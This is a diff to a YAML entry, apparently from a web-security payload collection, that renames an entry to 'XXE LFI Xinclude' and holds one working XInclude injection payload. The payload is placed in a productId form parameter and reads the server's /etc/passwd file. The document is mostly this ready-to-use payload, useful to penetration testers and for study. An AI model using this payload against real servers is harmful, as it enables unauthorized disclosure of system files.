@@ -1,9 +1,9 @@
-name: XXE LFI inline
+name: XXE LFI Xinclude
 description:
 commands:
   - command: |
       productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
-    description: LFI with inline XXE
+    description: LFI with Xinclude
 tags:
   - xxe
   - lfi
